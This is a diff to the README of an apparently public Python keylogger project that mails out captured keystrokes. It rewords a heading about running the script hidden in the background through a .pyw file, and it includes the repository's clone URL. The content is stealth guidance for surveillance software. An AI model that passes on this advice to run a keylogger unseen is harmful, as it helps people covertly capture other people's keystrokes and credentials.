@@ -22,7 +22,7 @@ The libraries required can be installed via:
 
 > `git clone https://github.com/reach-the-sky/Pyhton-Keylogger-mail.git
 
-##### To run the python file without opening a window
+##### To run the python file in background
 
 > Use keylogger-public.pyw (This extension allows you to run python script in the background).
 
